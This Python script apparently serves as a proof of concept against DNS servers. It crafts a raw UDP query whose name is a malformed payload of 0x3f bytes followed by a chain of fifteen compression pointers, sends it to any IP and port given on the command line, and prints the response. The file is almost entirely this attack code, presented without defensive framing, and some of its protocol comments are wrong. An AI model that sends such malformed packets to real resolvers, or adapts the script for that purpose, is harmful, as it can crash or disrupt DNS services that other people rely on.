import socket
import os
import argparse
import random
import string

#  无需connect服务端，因为发送时候跟上服务端ip和port就行
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def genRandom(num, slen):
    unique_strings = []
    while len(unique_strings) < num:
        ustring = ''.join(random.choice(string.ascii_lowercase + string.ascii_lowercase + string.digits) for i in range(slen))
        if ustring not in unique_strings:
            unique_strings.append(ustring)
    return unique_strings

def dnsquery(ip, port):
    query = os.urandom(2)
    query += b'\x01\x00' # Flags: query + Truncated + Recursion Desired + Recursion Available
    query += b'\x00\x01' # Questions
    query += b'\x00\x00' # Answer RRs
    query += b'\x00\x00' # Authority RRs
    query += b'\x00\x00'# Additional RRs

    # Queries
    payload = b'\x3f' * 0x40
    for i in range(15):
        payload += b'\xc0'
        payload += bytes([0xe + i * 2])
    payload += b'\x00'
    print(payload)
    query += payload  # Name
    query += b'\x00\x01' # Type: NS
    query += b'\x00\x01'# Class: IN

    client.sendto(query, (ip, int(port)))
    data, server_addr = client.recvfrom(1024)
    print(data)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-ip', help='ip address', required=True)
    parser.add_argument('-port', help='port', required=True)
    args = parser.parse_args()
    
    ip = args.ip
    port = args.port
    dnsquery(ip, port)


if __name__ == '__main__':
    main()